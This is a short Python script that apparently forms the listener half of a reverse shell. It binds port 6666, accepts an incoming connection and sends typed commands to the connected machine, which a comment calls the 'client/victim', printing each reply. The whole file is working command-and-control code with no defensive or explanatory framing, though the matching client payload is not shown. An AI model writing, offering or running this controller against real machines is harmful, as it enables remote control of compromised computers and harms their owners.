import socket
import sys

# Create a socket ( connect two computers )
def create_socket():
    try:
        global host
        global port
        global s

        host = ""
        port = 6666
        s = socket.socket()
    except socket.error as msg:
        print('[*] Socket creation error:',msg)

# Binding the socket and Listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print('[*] Binding the Port:', str(port))

        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print('[*] Socket Binding error' + str(msg) + "\n" + "Retrying...")
        bind_socket()

# Estabish the connection with a client (socket must be listening)
def socket_accept():
    conn, addrs = s.accept()
    print('Connection has been established! |' + "IP " + addrs[0] + "| Port " + str(addrs[1]))
    send_command(conn)
    conn.close()

# Send commands to client/victim or friends
def send_command(conn):
    while True:
        cmd = input("> ")
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024))
            print(client_response)

def main():
    create_socket()
    bind_socket()
    socket_accept()

if __name__ == '__main__':
    main()

